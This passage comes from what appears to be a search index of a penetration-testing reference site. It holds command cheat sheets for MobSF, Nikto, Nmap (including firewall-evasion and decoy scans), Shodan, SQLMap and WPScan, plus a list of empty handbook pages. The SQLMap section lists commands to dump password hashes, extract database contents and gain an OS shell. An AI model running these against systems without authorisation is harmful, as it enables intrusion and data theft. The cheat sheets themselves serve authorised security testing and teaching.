(Mobsf)","text":""},{"location":"Tools%20and%20Extensions/Tools%20Cheatsheet%20for%20Pentesting/mobile-security-framework-mobsf/#mobile-security-framework-mobsf","title":"Mobile Security Framework (Mobsf)","text":"<p>1. Overview:</p> <ul> <li>Mobile Security Framework (MobSF) is an open-source security testing application that supports Android, iOS, and Windows platforms.</li> <li>It provides both static and dynamic analysis capabilities for mobile applications.</li> </ul> <p>2. Static Analysis:</p> <ul> <li>Static analysis involves examining the source code of the mobile application.</li> <li>It helps in identifying vulnerabilities and security weaknesses before the application is executed.</li> <li>MobSF performs static analysis by analyzing the code against various coding rules and standards.</li> </ul> <p>3. Dynamic Analysis:</p> <ul> <li>Dynamic analysis involves testing the application while it is running.</li> <li>It helps in identifying security vulnerabilities and loopholes in the real-time operation of the application.</li> <li>MobSF facilitates dynamic analysis by monitoring the behavior of the running Android application and identifying potential security issues.</li> </ul> <p>4. Using MobSF:</p> <ul> <li>Install MobSF on your development machine by following the installation instructions provided in the official documentation.</li> <li>Launch MobSF and import the mobile application you want to analyze. You can import both binary files and zipped source code.</li> <li>Perform static analysis by running code analysis tools provided by MobSF. Analyze the source code against coding rules and standards to identify potential vulnerabilities.</li> <li>Perform dynamic analysis by running the mobile application in a controlled environment and monitoring its behavior using MobSF. MobSF provides various tools and features to simulate real-world attacks and identify security weaknesses.</li> <li>Review the analysis reports generated by MobSF to identify security vulnerabilities and take necessary actions to mitigate them.</li> </ul> <p>5. Example Usage:</p> <ul> <li>Static Analysis:<ul> <li>Use MobSF to scan the source code of the mobile application and identify insecure coding practices, hardcoded credentials, insecure data storage, etc.</li> </ul> </li> <li>Dynamic Analysis:<ul> <li>Run the mobile application in a controlled environment and use MobSF to monitor network traffic, API calls, file system operations, etc. Identify security vulnerabilities such as insecure network communication, sensitive data leakage, runtime permissions issues, etc.</li> </ul> </li> </ul> <p>6. Integration:</p> <ul> <li>MobSF can be integrated into continuous integration (CI) pipelines to automate the security testing process.</li> <li>Integrate MobSF with other security testing tools and frameworks to enhance the security testing capabilities of your mobile application development process.</li> </ul>"},{"location":"Tools%20and%20Extensions/Tools%20Cheatsheet%20for%20Pentesting/nikto/","title":"Nikto","text":""},{"location":"Tools%20and%20Extensions/Tools%20Cheatsheet%20for%20Pentesting/nikto/#nikto","title":"Nikto","text":"<p>To Perform a Basic Scan on a Specific Host </p><pre><code>nikto -host [target_host_IP/name]\n</code></pre> <p>To Conduct a Scan on a Host Across Multiple Ports (Default is 80) </p><pre><code>nikto -host [target_host_IP/name] -port [port1],[port2],[port3]\n</code></pre> <p>To Perform a Scan on a Host and Save Fingerprinted Information to a File </p><pre><code>nikto -host [target_host_IP/name] -output [output_filename]\n</code></pre> <p>To Utilize a Proxy Server During the Scan </p><pre><code>nikto -host [target_host_IP/name] -useproxy [proxy_address]\n</code></pre> <p>Additional Commands for Enhanced Nikto Usage</p> <p>To Specify a Timeout for Individual Checks (in seconds) </p><pre><code>nikto -host [target_host_IP/name] -maxtime [timeout_seconds]\n</code></pre> <p>To Exclude Specific Checks from the Scan </p><pre><code>nikto -host [target_host_IP/name] -nointeractive -Tuning &lt;option1&gt;,&lt;option2&gt;\n</code></pre> <p>To Perform a Scan While Specifying a User-Agent </p><pre><code>nikto -host [target_host_IP/name] -useragent [user_agent_string]\n</code></pre> <p>To Enable SSL/TLS on a Target Host </p><pre><code>nikto -host [target_host_IP/name] -ssl\n</code></pre> <p>To Perform a Scan Using HTTP Authentication </p><pre><code>nikto -host [target_host_IP/name] -id [username:password]\n</code></pre> <p>To Perform a Scan and Suppress Output to the Terminal </p><pre><code>nikto -host [target_host_IP/name] -output - &gt; /dev/null 2&gt;&amp;1\n</code></pre>"},{"location":"Tools%20and%20Extensions/Tools%20Cheatsheet%20for%20Pentesting/nmap/","title":"Basic Nmap Commands","text":""},{"location":"Tools%20and%20Extensions/Tools%20Cheatsheet%20for%20Pentesting/nmap/#basic-nmap-commands","title":"Basic Nmap Commands","text":"<p>To Perform a Basic Scan on a Single Target </p><pre><code>nmap [target_IP]\n</code></pre> <p>To Perform a Basic Scan on a Range of IP Addresses </p><pre><code>nmap [target_IP_range]\n</code></pre> <p>To Perform a Basic Scan on Multiple Targets Specified in a File </p><pre><code>nmap -iL [target_file]\n</code></pre> <p>To Perform a TCP SYN Scan </p><pre><code>nmap -sS [target_IP]\n</code></pre> <p>To Perform a TCP Connect Scan </p><pre><code>nmap -sT [target_IP]\n</code></pre>"},{"location":"Tools%20and%20Extensions/Tools%20Cheatsheet%20for%20Pentesting/nmap/#script-execution-with-nmap","title":"Script Execution with Nmap","text":"<p>To Execute a Specific Nmap Script </p><pre><code>nmap --script [script_name] [target_IP]\n</code></pre> <p>To Execute a Category of Scripts </p><pre><code>nmap --script [category] [target_IP]\n</code></pre> <p>To Execute Default Scripts Against a Target </p><pre><code>nmap -sC [target_IP]\n</code></pre>"},{"location":"Tools%20and%20Extensions/Tools%20Cheatsheet%20for%20Pentesting/nmap/#firewall-evasion-techniques","title":"Firewall Evasion Techniques","text":"<p>To Perform a Fragmentation Scan </p><pre><code>nmap -f [target_IP]\n</code></pre> <p>To Perform an Idle Scan </p><pre><code>nmap -sI [zombie_IP] [target_IP]\n</code></pre> <p>To Perform a Decoy Scan </p><pre><code>nmap -D [decoy_IP1,decoy_IP2,...] [target_IP]\n</code></pre> <p>To Use Source Port Manipulation </p><pre><code>nmap -g [source_port] [target_IP]\n</code></pre> <p>To Use Randomize Hosts and Ports </p><pre><code>nmap -r [target_IP]\n</code></pre>"},{"location":"Tools%20and%20Extensions/Tools%20Cheatsheet%20for%20Pentesting/nmap/#miscellaneous-nmap-commands","title":"Miscellaneous Nmap Commands","text":"<p>To Perform a UDP Scan </p><pre><code>nmap -sU [target_IP]\n</code></pre> <p>To Perform a Version Detection Scan </p><pre><code>nmap -sV [target_IP]\n</code></pre> <p>To Perform a Ping Scan </p><pre><code>nmap -sn [target_IP]\n</code></pre> <p>To Save Scan Results to a File </p><pre><code>nmap -oN [output_filename] [target_IP]\n</code></pre> <p>To Perform a Fast Scan with No Ping </p><pre><code>nmap -Pn [target_IP]\n</code></pre>"},{"location":"Tools%20and%20Extensions/Tools%20Cheatsheet%20for%20Pentesting/shodan/","title":"Shodan","text":""},{"location":"Tools%20and%20Extensions/Tools%20Cheatsheet%20for%20Pentesting/shodan/#shodan","title":"Shodan","text":"<p>Filter IP Range </p><pre><code>net:&lt;ip_range&gt;\n</code></pre> <p>Filter Port </p><pre><code>port:&lt;port&gt;\n</code></pre> <p>Filter Location </p><pre><code>city:\"&lt;city&gt;\" country:&lt;country_code&gt;\ngeo:&lt;latitude&gt;,&lt;longitude&gt;\n</code></pre> <p>Filter Hostname </p><pre><code>hostname:&lt;hostname&gt;\n</code></pre> <p>Filter Operating System </p><pre><code>os:&lt;operating_system&gt;\n</code></pre> <p>Filter Dates </p><pre><code>before:&lt;date&gt;\nafter:&lt;date&gt;\n</code></pre> <p>Acceptable date formats are day/month/year or day-month-year.</p>"},{"location":"Tools%20and%20Extensions/Tools%20Cheatsheet%20for%20Pentesting/shodan/#examples","title":"Examples","text":"<p>To search for devices in a specific city: </p><pre><code>city:\"New York\" country:US\n</code></pre> <p>To search for devices with a specific operating system: </p><pre><code>os:\"Windows\"\n</code></pre> <p>To search for devices with a specific port open: </p><pre><code>port:22\n</code></pre> <p>To search for devices in a specific IP range: </p><pre><code>net:192.168.0.0/24\n</code></pre> <p>To search for devices before a specific date: </p><pre><code>before:01/01/2023\n</code></pre>"},{"location":"Tools%20and%20Extensions/Tools%20Cheatsheet%20for%20Pentesting/sqlmap/","title":"SQLMap commands","text":""},{"location":"Tools%20and%20Extensions/Tools%20Cheatsheet%20for%20Pentesting/sqlmap/#sqlmap-commands","title":"SQLMap commands","text":"<p>Test URL and POST data and return database banner (if possible) </p><pre><code>./sqlmap.py --url=\"&lt;url&gt;\" --data=\"&lt;post-data&gt;\" --banner\n</code></pre> <p>Test Multiple URLs with default values and extract database names, saving results </p><pre><code>./sqlmap.py -m urls.txt --batch --dbs --output-dir=result\n</code></pre> <p>Parse request data and test (request data can be obtained with Burp) </p><pre><code>./sqlmap.py -r &lt;request-file&gt; &lt;options&gt;\n</code></pre> <p>Fingerprint (provides more information than banner) </p><pre><code>./sqlmap.py -r &lt;request-file&gt; --fingerprint\n</code></pre> <p>Get database username, name, and hostname </p><pre><code>./sqlmap.py -r &lt;request-file&gt; --current-user --current-db --hostname\n</code></pre> <p>Check if user is a database admin </p><pre><code>./sqlmap.py -r &lt;request-file&gt; --is-dba\n</code></pre> <p>Get database users and password hashes </p><pre><code>./sqlmap.py -r &lt;request-file&gt; --users --passwords\n</code></pre> <p>Enumerate databases </p><pre><code>./sqlmap.py -r &lt;request-file&gt; --dbs\n</code></pre> <p>List tables for one database </p><pre><code>./sqlmap.py -r &lt;request-file&gt; -D &lt;db-name&gt; --tables\n</code></pre> <p>Other database commands </p><pre><code>./sqlmap.py -r &lt;request-file&gt; -D &lt;db-name&gt; --columns\n              --schema\n              --count\n</code></pre> <p>Enumeration flags </p><pre><code>./sqlmap.py -r &lt;request-file&gt; -D &lt;db-name&gt;\n                  -T &lt;tbl-name&gt;\n                  -C &lt;col-name&gt;\n                  -U &lt;user-name&gt;\n</code></pre> <p>Extract data </p><pre><code>./sqlmap.py -r &lt;request-file&gt; -D &lt;db-name&gt; -T &lt;tbl-name&gt; -C &lt;col-name&gt; --dump\n</code></pre> <p>Execute SQL Query </p><pre><code>./sqlmap.py -r &lt;request-file&gt; --sql-query=\"&lt;sql-query&gt;\"\n</code></pre> <p>Append/Prepend SQL Queries </p><pre><code>./sqlmap.py -r &lt;request-file&gt; --prefix=\"&lt;sql-query&gt;\" --suffix=\"&lt;sql-query&gt;\"\n</code></pre> <p>Get backdoor access to SQL server (can provide shell access) </p><pre><code>./sqlmap.py -r &lt;request-file&gt; --os-shell\n</code></pre>"},{"location":"Tools%20and%20Extensions/Tools%20Cheatsheet%20for%20Pentesting/wpscan/","title":"WPScan commands","text":""},{"location":"Tools%20and%20Extensions/Tools%20Cheatsheet%20for%20Pentesting/wpscan/#wpscan-commands","title":"WPScan commands","text":"<p>Basic Usage </p><pre><code>wpscan --url \"target\" --verbose\n</code></pre> <p>Enumerate Vulnerable Plugins, Users, Vulnerable Themes, Timthumbs </p><pre><code>wpscan --url \"target\" --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log\n</code></pre>"},{"location":"blog/","title":"Blog","text":""},{"location":"handbook/","title":"Handbooks","text":""},{"location":"handbook/#handbooks","title":"Handbooks","text":"<ul> <li> <p> CVE-2024-3094 Handbook</p> <p>CVE-2024-3094, a critical vulnerability impacting various Linux distributions, has been uncovered in XZ Utils. Get to know more about it in the CVE-2024-3094 Handbook.</p> </li> <li> <p> IDOR Handbook</p> <p>A comprehensive guide to identifying, exploiting and mitigating Insecure Direct Object Reference vulnerabilities.</p> </li> <li> <p> Insecure Deserialization Handbook</p> <p>Detailed insights into detecting and preventing attacks stemming from insecure deserialization flaws.</p> </li> <li> <p> JWT Attacks Handbook</p> <p>Essential strategies and best practices for exploiting and securing JSON Web Tokens (JWT) in modern applications.</p> </li> <li> <p> SSTI Handbook</p> <p>A focused overview of Server-Side Template Injection, exploring its risks and mitigation techniques.</p> </li> <li> <p> Unrestricted File Upload Attacks Handbook</p> <p>A practical manual on identifying and defending against threats posed by unrestricted file uploads in web environments.</p> </li> </ul>"},{"location":"handbook/CVE-2024-3094-Handbook/","title":"CVE-2024-3094 Handbook","text":""},{"location":"handbook/CVE-2024-3094-Handbook/#cve-2024-3094-handbook","title":"CVE-2024-3094 Handbook","text":""},{"location":"handbook/IDOR-Handbook/","title":"IDOR Handbook","text":""},{"location":"handbook/IDOR-Handbook/#idor-handbook","title":"IDOR Handbook","text":""},{"location":"handbook/Insecure-Deserialization-Handbook/","title":"Insecure Deserialization Handbook","text":""},{"location":"handbook/Insecure-Deserialization-Handbook/#insecure-deserialization-handbook","title":"Insecure Deserialization Handbook","text":""},{"location":"handbook/JWT-Handbook/","title":"JWT Attacks Handbook","text":""},{"location":"handbook/JWT-Handbook/#jwt-attacks-handbook","title":"JWT Attacks Handbook","text":""},{"location":"handbook/SSTI-Handbook/","title":"SSTI Handbook","text":""},{"location":"handbook/SSTI-Handbook/#ssti-handbook","title":"SSTI Handbook","text":""},{"location":"handbook/Unrestricted-File-Upload-Handbook/","title":"Unrestricted File Upload Attacks Handbook","text":""},{"location":"handbook/Unrestricted-File-Upload-Handbook/#unrestricted-file-upload-attacks-handbook","title":"Unrestricted File Upload Attacks Handbook","text":""}]}